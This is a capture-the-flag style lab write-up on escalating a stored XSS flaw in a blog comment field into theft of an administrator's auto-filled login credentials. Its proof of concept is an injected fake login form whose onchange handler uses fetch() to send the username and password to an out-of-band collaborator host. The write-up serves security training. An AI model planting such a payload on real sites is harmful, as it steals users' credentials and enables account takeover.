# Exploiting cross-site scripting to capture passwords

**URL:** https://YOUR-LAB-ID.web-security-academy.net
**Difficulty:** Practitioner
**Vulnerability:** Stored XSS escalated to credential capture via a fake login field

---

## Summary

A blog comment field allows injecting raw HTML with no delivery mechanism needed, since it's stored persistently on the real site and the platform's simulated administrator naturally browses posts on its own schedule. Injecting a fake username/password field pair captures real credentials when the simulated admin's browser auto-fills them, exfiltrated via an out-of-band listener.

---

## Discovery and Exploitation

### Step 1

Confirmed the comment field allowed raw HTML injection with no output encoding (same stored-XSS primitive as the basic HTML-context lab).

### Step 2

Generated an out-of-band collaborator payload to use as the exfiltration listener - stored XSS is already live on the real site, so no separate delivery mechanism (like the exploit server) is needed at all; the simulated administrator will encounter the comment on its own.

### Step 3

Posted a comment containing fake username and password input fields, with an `onchange` handler on the password field that sends both values to the collaborator listener as soon as it has a value.

### Step 4

Polled the collaborator listener - within about 20 seconds, a request arrived containing the administrator's real username and a real password value, confirming the simulated admin's browser had auto-filled the fake fields.

### Step 5

Logged in as the administrator using the captured password to complete the takeover.


---

## Proof of Concept

```
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR-ID.oastify.com/log/'+username.value+'/'+this.value,{mode:'no-cors'})">
```

---

## Root Cause

Same unescaped stored-content root cause as the basic HTML-context lab; this lab demonstrates that stored XSS can be escalated into a credential-harvesting attack without needing any active delivery step, since the payload persists on the real site.

---

## CWE

- **CWE-79: Cross-site Scripting**
- **CWE-522: Insufficiently Protected Credentials**
